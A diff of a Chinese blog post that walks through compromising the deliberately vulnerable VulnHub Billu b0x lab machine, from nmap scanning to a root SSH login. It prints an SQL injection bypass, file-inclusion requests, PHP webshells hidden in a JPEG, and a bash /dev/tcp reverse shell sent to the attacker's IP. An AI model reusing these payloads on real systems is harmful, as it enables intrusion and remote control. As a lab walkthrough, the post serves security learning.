@@ -12,7 +12,7 @@
 
 
 
-<title>VulnHub BiLLu靶机渗透测试学习 | Bantian</title>
+<title>VulnHub_BiLLu靶机渗透测试学习 | Bantian</title>
 
 
 
@@ -169,7 +169,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">VulnHub BiLLu靶机渗透测试学习</h1>
+            <h1 class="post-title">VulnHub_BiLLu靶机渗透测试学习</h1>
             
                 <div class="post-meta">
                     
@@ -189,15 +189,15 @@
         <div class="post-content">
             <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为之前都在学习代码审计比较多，然后对渗透测试这一块实在是没什么了解，之前本科的时候想要学习过，但是那个时候设备太菜了，同时运行靶机和攻击机实在是有点卡得吃不消。现在趁着这两天稍微轻松点，所以学习一点简单的渗透知识。</p>
 <p>这次采用的靶机是vulnhub上的Billu靶机，可以在这里下载： <a href="https://www.vulnhub.com/entry/billu-b0x,188/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/billu-b0x,188/</a>  。</p>
-<p>下载后是一个ova文件，导入vmware或是virtual box即可。</p>
+<p>下载后是一个ova文件，导入vmware或是virtual box，记得把网络连接改为<code>DHCP</code>模式即可。</p>
 <h2 id="实验靶机"><a href="#实验靶机" class="headerlink" title="实验靶机"></a>实验靶机</h2><p><strong>靶机</strong> ：Billu</p>
 <p><strong>攻击机</strong> : Kali 2020.02，这个版本的kali和前几年的相比，感觉在UI方面改进了好多，对密码也进行了修改，变成了<code>kali:kali</code>，没想到的是去掉了root用户，具体的可以参考官方链接： <a href="https://www.kali.org/docs/introduction/default-credentials/" target="_blank" rel="noopener">https://www.kali.org/docs/introduction/default-credentials/</a> 。</p>
 <p>主机和靶机的网络都采用<code>DHCP</code>模式，位于同一局域网下。</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>当前的攻击机的ip地址为<code>192.168.247.210</code>，所以我们要扫描的网络范围可以确定为<code>192.168.247.1/24</code>：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/3.png" alt="3"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/3.png" alt="3"></p>
 <p>这里收集主机信息可以用<code>metasploit</code>或是更为强大的<code>nmap</code>。</p>
 <h4 id="目标主机探测"><a href="#目标主机探测" class="headerlink" title="目标主机探测"></a>目标主机探测</h4><h5 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h5><p>在Metasploit中也存在一些模块可以用于主机探测，这些模块位于Metasploit源码的<code>modules/auxiliary/scanner/discovery</code>路径下，主要有这么几个：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/1.png" alt="1"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/1.png" alt="1"></p>
 <p>这里可能第一个和最后一个用的比较多：</p>
 <blockquote>
 <p><strong>arp_sweep</strong> ： 使用arp请求枚举本地局域网络中的所有活跃主机</p>
@@ -207,7 +207,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/discovery/arp_sweep </span><br><span class="line">msf5 auxiliary(scanner/discovery/arp_sweep) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/discovery/arp_sweep):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   INTERFACE                   no        The name of the interface</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'</span><br><span class="line">   SHOST                       no        Source IP Address</span><br><span class="line">   SMAC                        no        Source MAC Address</span><br><span class="line">   THREADS    1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TIMEOUT    5                yes       The number of seconds to wait for new data</span><br></pre></td></tr></table></figure>
 
 <p>新版的kali默认不是root用户，这个需要root权限。</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/2.png" alt="2"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/2.png" alt="2"></p>
 <p>但是<strong>arp_sweep</strong> 只能探测同一子网中的主机，对于远程的网络，<strong>nmap</strong> 是更好的选择。</p>
 <h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>命令格式为：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap &lt;扫描选项&gt; &lt;扫描目标&gt;</span><br></pre></td></tr></table></figure>
@@ -219,17 +219,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-Pn: 在扫描之前，不发送ICMP echo请求测试目标是否存活</span><br><span class="line">-O: 启用对于TCP&#x2F;IP协议栈的指纹特征扫描以获取远程主机的操作系统类型等信息</span><br><span class="line">-F: 快速扫描模式，只扫描在nmap-services中列出的端口</span><br><span class="line">-p&lt;端口范围&gt;: 可以使用这个参数指定希望扫描的端口（如-p1080），也可以使用一段端口范围（例如1-1023）</span><br></pre></td></tr></table></figure>
 
 <p>直接用<code>nmap -sP 192.168.247.1/24</code>进行扫描：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/4.png" alt="4"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/4.png" alt="4"></p>
 <p>可以发现目标主机的ip为<code>192.168.247.211</code>。</p>
 <h4 id="主机服务信息探测"><a href="#主机服务信息探测" class="headerlink" title="主机服务信息探测"></a>主机服务信息探测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 -A 192.168.247.211 -oN billu.txt</span><br></pre></td></tr></table></figure>
 
 <p>其中<code>-A</code>表示获取详细的操作系统信息，<code>-oN</code>表示保存扫描结果到某个文件，这里是<code>billu.txt</code>：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/5.png" alt="5"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/5.png" alt="5"></p>
 <p>扫描后发现开启了两个服务，一个<code>apache</code>，另一个<code>ssh</code>服务：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br></pre></td></tr></table></figure>
 
 <h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>在目标主机的80端口上有网站服务，访问后看到是一个登录界面：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/6.png" alt="6"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/6.png" alt="6"></p>
 <p>从提示看是要考察sql注入。到这里先捋一下思路。</p>
 <p>渗透测试中的漏洞挖掘部分主要有这么几个流程，主要参考<a href="https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&mid=2649847367&idx=1&sn=54a6ab79ef342d2bb96b4f97bc87cef5&chksm=f3e418c4c49391d2569a4987ce377518ec1158dd4cfb6edb91718d7fdcc7c91abb4737d3a74f&scene=21" target="_blank" rel="noopener">红日安全的这篇文章</a>：</p>
 <blockquote>
@@ -242,42 +242,42 @@
 <li>如果能得到用户名，密码，尝试登录ssh，如果能连接成功，则无需反弹shell</li>
 </ol>
 </blockquote>
-<h5 id="第一步：SQL注入"><a href="#第一步：SQL注入" class="headerlink" title="第一步：SQL注入"></a>第一步：SQL注入</h5><p>最先尝试下万能密码：</p>
+<h3 id="第一步：SQL注入"><a href="#第一步：SQL注入" class="headerlink" title="第一步：SQL注入"></a>第一步：SQL注入</h3><p>最先尝试下万能密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or &#39;1&#39;&#x3D;&#39;1 --</span><br></pre></td></tr></table></figure>
 
 <p>登录失败，跳出一个弹窗：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/7.png" alt="7"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/7.png" alt="7"></p>
 <p>拿sqlmap试一下，稍微介绍下sqlmap的参数选项：</p>
 <blockquote>
 <p><strong>-u</strong> : 目标URL<br><strong>–data</strong> : 这个参数表示以POST方式提交请求数据<br><strong>–level</strong> : 表示探测等级，默认为1，失sqlmap使用的payload可以在xml/payloads.xml中看到，当–level的参数设定为2或者是2以上的时候，会尝试注入<strong>Cookie</strong>参数； 当–level参数设定为3或者3以上的时候，会尝试对<strong>User-Agent</strong>进行注入；当无法确定哪个payload或者参数为注入点的时候，可以直接使用最高的level<br><strong>–dbms</strong> : 表示指定的数据库，不过默认情况下sqlmap会自己进行探测</p>
 </blockquote>
 <p>所以需要先尝试登录获取一些post请求参数字段：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/8.png" alt="8"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/8.png" alt="8"></p>
 <p>请求的form表单需要三个参数：<code>un</code>，<code>ps</code>和<code>login</code>：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.247.211" --data "un=admin&amp;ps=admin&amp;login=let%27+login" --level 3 --dbms mysql</span><br></pre></td></tr></table></figure>
 
 <p>但是注入失败：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/9.png" alt="9"></p>
-<h5 id="第二步：爆破目录"><a href="#第二步：爆破目录" class="headerlink" title="第二步：爆破目录"></a>第二步：爆破目录</h5><p>因为登录失败，爆破一下目录看看有没有其他的网页可以作为入口，这里用Kali中的<code>DirBuster</code>。</p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/9.png" alt="9"></p>
+<h3 id="第二步：爆破目录"><a href="#第二步：爆破目录" class="headerlink" title="第二步：爆破目录"></a>第二步：爆破目录</h3><p>因为登录失败，爆破一下目录看看有没有其他的网页可以作为入口，这里用Kali中的<code>DirBuster</code>。</p>
 <p>从扫描结果中可以看到网页信息：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/10.png" alt="10"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/10.png" alt="10"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php</span><br><span class="line">&#x2F;in.php</span><br><span class="line">&#x2F;c.php</span><br><span class="line">&#x2F;show.php</span><br><span class="line">&#x2F;add.php</span><br><span class="line">&#x2F;test.php</span><br><span class="line">&#x2F;head.php</span><br><span class="line">&#x2F;panel.php</span><br></pre></td></tr></table></figure>
 
 <p>以及目录信息：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/11.png" alt="11"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/11.png" alt="11"></p>
 <p>扫描目录还可以用<code>dirb</code>：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb "http://192.168.247.211" /usr/share/dirb/wordlists/big.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/12.png" alt="12"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/12.png" alt="12"></p>
 <p>这里发现了<code>Dirbuster</code>没扫出来的一个很重要的目录：<code>/phpmy</code>，根据名字，这非常有可能是phpmyadmin的目录，最后的目录为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;images</span><br><span class="line">&#x2F;icons</span><br><span class="line">&#x2F;doc</span><br><span class="line">&#x2F;icons&#x2F;small</span><br><span class="line">&#x2F;uploaded_images</span><br><span class="line">&#x2F;phpmy</span><br></pre></td></tr></table></figure>
 
-<h5 id="第三步：访问页面"><a href="#第三步：访问页面" class="headerlink" title="第三步：访问页面"></a>第三步：访问页面</h5><p>在访问<code>test.php</code>的时候发现回显，接受一个参数<code>file</code>，看上去应该是文件包含漏洞：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/13.png" alt="13"></p>
+<h3 id="第三步：访问页面"><a href="#第三步：访问页面" class="headerlink" title="第三步：访问页面"></a>第三步：访问页面</h3><p>在访问<code>test.php</code>的时候发现回显，接受一个参数<code>file</code>，看上去应该是文件包含漏洞：</p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/13.png" alt="13"></p>
 <p>但是不知道是get方式还是post方式，都试一下，当采用get请求时，返回了当前页面，再试一下post请求方式：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;test.php</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/14.png" alt="14"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/14.png" alt="14"></p>
 <p>果然存在文件包含，顺便从<code>/etc/passwd</code>可以看到存在用户<code>ica</code>，但是登录密码是什么还是未知。</p>
 <p>那可以来读取一下之前爆破出的网页的源码。</p>
 <p><code>test.php</code>：</p>
@@ -298,12 +298,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#header( 'Z-Powered-By:its chutiyapa xD' );</span></span><br><span class="line">header(<span class="string">'X-Frame-Options: SAMEORIGIN'</span>);</span><br><span class="line">header( <span class="string">'Server:testing only'</span> );</span><br><span class="line">header( <span class="string">'X-Powered-By:testing only'</span> );</span><br><span class="line"></span><br><span class="line">ini_set( <span class="string">'session.cookie_httponly'</span>, <span class="number">1</span> );</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"billu"</span>,<span class="string">"b0x_billu"</span>,<span class="string">"ica_lab"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"connection failed -&gt;  "</span> . mysqli_connect_error();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><code>mysqli_connect</code>函数是<code>mysqli::__construct()</code>函数的别名：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/15.png" alt="15"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/15.png" alt="15"></p>
 <p>第2个参数和第3个参数分别是登录数据库的账号和密码，所以得到了登录数据库的账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: billu</span><br><span class="line">password: b0x_billu</span><br></pre></td></tr></table></figure>
 
 <p>看看能不能登录phpmyadmin，访问<code>http://192.168.247.211/phpmy</code> ：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/16.png" alt="16"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/16.png" alt="16"></p>
 <p>成功登录了。这样我们就得到了明文存储的账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: biLLu	</span><br><span class="line">password: hEx_it</span><br></pre></td></tr></table></figure>
 
@@ -314,45 +314,45 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$uname=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'un'</span>]));</span><br><span class="line">$pass=str_replace(<span class="string">'\''</span>,<span class="string">''</span>,urldecode($_POST[<span class="string">'ps'</span>]));</span><br><span class="line">$run=<span class="string">'select * from auth where  pass=\''</span>.$pass.<span class="string">'\' and uname=\''</span>.$uname.<span class="string">'\''</span>;</span><br><span class="line">$result = mysqli_query($conn, $run);</span><br></pre></td></tr></table></figure>
 
 <p>程序会调用<code>str_replace</code>将username和password中的<code>&#39;</code>字符都替换为<code>&#39;&#39;</code>，在本地测试了下，传入的<code>admin&#39; or &#39;1&#39;=&#39;1</code>中的<code>&#39;</code>全部都被替换为空字符串了：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/25.png" alt="25"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/25.png" alt="25"></p>
 <p>因为<code>pass</code>在查询的and语句的前半部分，所以可以通过先注释掉pass的<code>&#39;</code>来闭合：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/26.png" alt="26"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/26.png" alt="26"></p>
 <p>所以如果要进行sql注入，那payload就是：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">un: or 1&#x3D;1 --</span><br><span class="line">ps: \</span><br></pre></td></tr></table></figure>
 
 <p>经过测试，这样是可以成功登录的。</p>
 <p>任意文件读取漏洞那里还可以读取<code>phpmyadmin</code>的配置文件，默认为<code>/var/www/phpmy/config.inc.php</code> :</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/18.png" alt="18"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/18.png" alt="18"></p>
 <blockquote>
 <p><code>$cfg[&#39;Servers&#39;][$i][&#39;user&#39;]</code> ：MySQL连接用户<br><code>$cfg[&#39;Servers&#39;][$i][&#39;password&#39;]</code> ：登录密码</p>
 </blockquote>
 <p>得到了用户登录mysql的账户密码<code>root : roottoor</code>。</p>
 <p>尝试用这个登录ssh，登录成功！</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/19.png" alt="19"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/19.png" alt="19"></p>
 <h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><h5 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h5><p>先利用之前获得的账号密码<code>biLLu : hEx_it</code>登录网站<code>http://192.168.247.211</code>：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/17.png" alt="17"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/17.png" alt="17"></p>
 <p>在上面的选项框中有两个选择：<code>Show Users</code>和<code>Add User</code>。前面也说过，在<code>panel.php</code>文件中存在一个文件包含漏洞：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/20.png" alt="20"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/20.png" alt="20"></p>
 <p>这里<code>$_POST[&#39;load&#39;]</code>是完全可控的，可以包含任意的文件，比如令<code>load=../../../etc/passwd</code>：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/21.png" alt="21"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/21.png" alt="21"></p>
 <p>然后<code>panel.php</code>中又包含图片上传功能，所以我们的目标就是上传一个图片马，然后用任意文件包含给它包含进来。</p>
 <p>先在本地随便新建一个图片，因为前面会判断图片的类型，所以这里就直接用jpg的文件头<code>FFD8FFE</code>创建了一个图片，然后在末尾追加一句话木马：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Pictures$ rm evil.jpg </span><br><span class="line">kali@kali:~/Pictures$ echo 'FFD8FFEo' | xxd -r -p &gt; evil.jpg</span><br><span class="line">kali@kali:~/Pictures$ echo '&lt;?php system($_GET['cmd']);?&gt;' &gt;&gt; evil.jpg</span><br><span class="line">kali@kali:~/Pictures$ cat evil.jpg </span><br><span class="line">���&lt;?php system($_GET[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>创建jpg图片使用的命令为<code>xxd -r -p</code>，可以把纯十六进制转储为二进制文件。</p>
 <p>上传后的图片马被保存在<code>/uploaded_images</code>文件夹下：</p>
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/22.png" alt="22"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/22.png" alt="22"></p>
 <p>所以加下来利用<code>panel.php</code>中的文件包含漏洞将该文件包含进来：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url: </span><br><span class="line">&#x2F;panel.php?cmd&#x3D;ls</span><br><span class="line"></span><br><span class="line">POST: </span><br><span class="line">load&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;uploaded_images&#x2F;evil.jpg&amp;continue&#x3D;continue</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/06/12/vulnhub_Billu/imgs/23.png" alt="23"></p>
+<p><img src="/2020/06/12/VulnHub_Billu/imgs/23.png" alt="23"></p>
 <h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>然后通过反弹shell进一步控制目标主机：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.247.210&#x2F;23333 0&gt;&amp;1&quot; | bash</span><br></pre></td></tr></table></figure>
 
 <p>url编码一下再请求：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;panel.php?cmd&#x3D;%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%32%34%37%2e%32%31%30%2f%32%33%33%33%33%20%30%3e%26%31%22%20%7c%20%62%61%73%68 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.247.211</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.247.211&#x2F;panel.php</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;b7uv2mvjig2lrs6v4n8s71qad5</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">load&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;uploaded_images&#x2F;evil.jpg&amp;continue&#x3D;continue</span><br></pre></td></tr></table></figure>
 
-<p>获得了靶机的bash：<br><img src="/2020/06/12/vulnhub_Billu/imgs/24.png" alt="24"></p>
+<p>获得了靶机的bash：<br><img src="/2020/06/12/VulnHub_Billu/imgs/24.png" alt="24"></p>
 <p>接着找一个具有写权限的目录，写入木马：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@indishell:/var/www$ cd uploaded_images</span><br><span class="line">cd uploaded_images</span><br><span class="line">www-data@indishell:/var/www/uploaded_images$ echo '&lt;?php eval($_POST[1]);?&gt;' &gt;&gt; shell.php</span><br><span class="line">&lt;/uploaded_images$ echo '&lt;?php eval($_POST[1]);?&gt;' &gt;&gt; shell.php              </span><br><span class="line">www-data@indishell:/var/www/uploaded_images$ ls</span><br><span class="line">ls</span><br><span class="line">3.jpg</span><br><span class="line">CaptBarbossa.JPG</span><br><span class="line">c.JPG</span><br><span class="line">evil.jpg</span><br><span class="line">jack.jpg</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure>
 
@@ -377,7 +377,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://bantttian.github.io/2020/06/12/vulnhub_Billu/">https://bantttian.github.io/2020/06/12/vulnhub_Billu/</a></span>
+                        <span><a href="https://bantttian.github.io/2020/06/12/VulnHub_Billu/">https://bantttian.github.io/2020/06/12/VulnHub_Billu/</a></span>
                     </p>
                 
                 
@@ -400,6 +400,12 @@
                 <span>Tag(s):</span>
                 <span class="tag">
                     
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
                 </span>
             </div>
             <div>
@@ -413,25 +419,9 @@
                 <a class="prev" rel="prev" href="/2020/06/17/VulnHub_Acid/">VulnHub_Acid靶机渗透测试学习</a>
             
             
-            <a class="next" rel="next" href="/2020/06/12/VulnHub_Billu/">VulnHub_BiLLu靶机渗透测试学习</a>
+            <a class="next" rel="next" href="/2020/06/07/%5BCISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day1-Web4%5D-Laravel1/">CISCN2019 总决赛 Day1 Web4_Laravel1</a>
             
         </section>
-
-
-    </article>
-</div>
-
-        </div>
-        <footer id="footer" class="footer">
-    <div class="copyright">
-        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
-    </div>
-</footer>
-
-    </div>
-</body>
-</html>
-     </section>
 
 
     </article>
